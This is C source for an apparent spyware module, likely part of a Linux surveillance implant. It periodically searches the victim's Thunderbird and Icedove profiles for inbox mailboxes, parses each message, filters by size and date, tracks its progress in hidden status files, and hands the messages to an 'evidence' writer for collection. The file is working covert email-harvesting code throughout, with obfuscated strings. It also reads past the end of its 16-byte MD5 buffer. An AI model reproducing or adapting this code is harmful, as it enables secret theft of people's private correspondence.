#include <unistd.h>
#include <string.h>
#include <glob.h>
#include <linux/limits.h>
#include <openssl/bio.h>
#include <openssl/md5.h>

#include "module.h"
#include "evidencemanager.h"
#include "me.h"
#include "so.h"

#define FOLDER_INBOX 0x0010
#define FOLDER_SENT  0x0100

#define PROGRAM_THUNDERBIRD 0x03

struct additional {
   unsigned int version;
   unsigned int flags;
   unsigned int size;
   unsigned int ltime;
   unsigned int htime;
   unsigned int program;
} __attribute__((packed));

static void thunderbirdmain(void);
static int thunderbirdget(char *mbox, int foldertype);
static int getmail(BIO *bio_data, int foldertype, int program);
static time_t parsedate(char *header);

void *module_messages_main(void *args)
{
   int i = 0;
   fd_set rfds;
   struct timeval tv;

   debugme("Module MESSAGES started\n");

   while(MODULE_MESSAGES.status != MODULE_STOPPING) {
      if(MODULE_MESSAGES_P->enabled) {
         thunderbirdmain();
      }

      FD_ZERO(&rfds);
      FD_SET(MODULE_MESSAGES.event, &rfds);
      tv.tv_sec = 300;
      tv.tv_usec = 0;
      select(MODULE_MESSAGES.event + 1, &rfds, NULL, NULL, &tv);
   }

   debugme("Module MESSAGES stopped\n");

   return NULL;
}

static void thunderbirdmain(void)
{
   glob_t g;
   int i;

   do {
      memset(&g, 0, sizeof(g));
      if(glob(SO"~/.{thunderbird,icedove}/*/{Imap,}Mail/*/I{NBOX,nbox}", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;
      for(i = 0; i < g.gl_pathc; i++) thunderbirdget(g.gl_pathv[i], FOLDER_INBOX);
   } while(0);
   globfree(&g);

#if 0
   /* TODO XXX gestire la localizzazione della cartella della posta inviata */
   do {
      memset(&g, 0, sizeof(g));
      if(glob(SO"~/.{thunderbird,icedove}/*/{Imap,}Mail/*/{*/,}S{ENT,ent}*", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;
      for(i = 0; i < g.gl_pathc; i++) thunderbirdget(g.gl_pathv[i], FOLDER_SENT);
   } while(0);
   globfree(&g);
#endif

   return;
}

static int thunderbirdget(char *mbox, int foldertype)
{
   FILE *fp = NULL;
   char line[4096];
   BIO *bio_data = NULL;
   time_t date = 0;
   int len = 0;
   unsigned char md5[MD5_DIGEST_LENGTH];
   char statusfile[4 + (MD5_DIGEST_LENGTH * 2) + 1];
   int offset = 0;

   do {
      debugme("Mailbox: %s\n", mbox);
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;
      MD5((unsigned char *)mbox, strlen(mbox), md5);

      snprintf(statusfile, sizeof(statusfile), SO"MM%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                                               md5[0], md5[1], md5[2], md5[3], md5[4], md5[5], md5[6], md5[7], md5[8], md5[9],
                                               md5[10], md5[11], md5[12], md5[13], md5[14], md5[15], md5[16], md5[17], md5[18], md5[19]);

      do {
         if(!(fp = fopen(statusfile, "r"))) break;
         if(!fgets(line, sizeof(line), fp)) break;
         offset = atoi(line);
      } while(0);
      if(fp) fclose(fp);

      if(!(fp = fopen(mbox, "r"))) break;
      if(offset) fseek(fp, offset, SEEK_SET);

      if(!fgets(line, sizeof(line), fp) || strncmp(line, SO"From ", strlen(SO"From "))) break;

      while(!feof(fp)) {
         if(!fgets(line, sizeof(line), fp)) break;
         if(strncmp(line, SO"From ", strlen(SO"From "))) {
            do {
               if(!strncmp(line, SO"X-Mozilla-Status: ", strlen(SO"X-Mozilla-Status: "))) break;
               if(!strncmp(line, SO"X-Mozilla-Status2: ", strlen(SO"X-Mozilla-Status2: "))) break;
               if(!strncmp(line, SO"Date: ", strlen(SO"Date: "))) date = parsedate(line + strlen(SO"Date: "));
               BIO_write(bio_data, line, strlen(line));
               len += strlen(line);
            } while(0);
            continue;
         } else {
            do {
               debugme("---| MESSAGE FILTERS |---\n");
               debugme("Size: %u (%u max)\n", len, MODULE_MESSAGES_P->maxsize);
               debugme("From: %u (%u min, %u max)\n", date, MODULE_MESSAGES_P->from, MODULE_MESSAGES_P->to);
               /* TODO XXX fare il dequoting del From */
               if(!len || (len > MODULE_MESSAGES_P->maxsize)) break;
               if(date && (MODULE_MESSAGES_P->from != ((time_t) -1)) && (date < MODULE_MESSAGES_P->from)) break;
               if(date && (MODULE_MESSAGES_P->to != ((time_t) -1)) && (date > MODULE_MESSAGES_P->to)) break;
               getmail(bio_data, foldertype, PROGRAM_THUNDERBIRD);
               len = 0;
               date = 0;
            } while(0);
            BIO_reset(bio_data);
         }
      }
      do {
         if(!len || (len > MODULE_MESSAGES_P->maxsize)) break;
         if(date && (MODULE_MESSAGES_P->from != ((time_t) -1)) && (date < MODULE_MESSAGES_P->from)) break;
         if(date && (MODULE_MESSAGES_P->to != ((time_t) -1)) && (date > MODULE_MESSAGES_P->to)) break;
         getmail(bio_data, foldertype, PROGRAM_THUNDERBIRD);
         len = 0;
         date = 0;
      } while(0);
   } while(0);
   if(fp) {
      offset = ftell(fp);
      fclose(fp);
   }
   if(bio_data) BIO_free(bio_data);

   do {
      if(!(fp = fopen(statusfile, "w"))) break;
      fprintf(fp, "%u", offset);
   } while(0);
   if(fp) fclose(fp);

   return 0;
}

static int getmail(BIO *bio_data, int foldertype, int program)
{
   BIO *bio_additional = NULL;
   int additionallen, datalen;
   char *additionalptr, *dataptr;
   struct additional a;

   do {
      if(!(bio_additional = BIO_new(BIO_s_mem()))) break;

      if(!(datalen = BIO_get_mem_data(bio_data, &dataptr))) break;

      a.version = 2012030601;
      a.flags = foldertype;
      a.size = datalen;
      a.ltime = 0;
      a.htime = 0;
      a.program = program;

      if(BIO_write(bio_additional, &a, sizeof(a)) != sizeof(a)) break;

      additionallen = BIO_get_mem_data(bio_additional, &additionalptr);
      datalen = BIO_get_mem_data(bio_data, &dataptr);

      evidence_write(EVIDENCE_TYPE_MAIL, additionalptr, additionallen, dataptr, datalen);
   } while(0);
   if(bio_additional) BIO_free(bio_additional);

   return 0;
}

static time_t parsedate(char *s)
{
   struct tm t;
   char month[4], osign;
   int ohour, omin;
   time_t ret = 0;

   do {
      memset(&t, 0, sizeof(t));
      if(sscanf(s, SO"%*3s, %d %3s %d %d:%d:%d %c%2d%2d", &t.tm_mday, month, &t.tm_year, &t.tm_hour, &t.tm_min, &t.tm_sec, &osign, &ohour, &omin) != 9) break;

      if(!strcmp(month, SO"Jan")) t.tm_mon = 0;
      else if(!strcmp(month, SO"Feb")) t.tm_mon = 1;
      else if(!strcmp(month, SO"Mar")) t.tm_mon = 2;
      else if(!strcmp(month, SO"Apr")) t.tm_mon = 3;
      else if(!strcmp(month, SO"May")) t.tm_mon = 4;
      else if(!strcmp(month, SO"Jun")) t.tm_mon = 5;
      else if(!strcmp(month, SO"Jul")) t.tm_mon = 6;
      else if(!strcmp(month, SO"Aug")) t.tm_mon = 7;
      else if(!strcmp(month, SO"Sep")) t.tm_mon = 8;
      else if(!strcmp(month, SO"Oct")) t.tm_mon = 9;
      else if(!strcmp(month, SO"Nov")) t.tm_mon = 10;
      else if(!strcmp(month, SO"Dec")) t.tm_mon = 11;
      else break;

      t.tm_year -= 1900;

      ret = mktime(&t) + ((osign == '-' ? 1 : -1) * ((ohour * 3600) + (omin * 60)));
   } while(0);

   return ret;
}
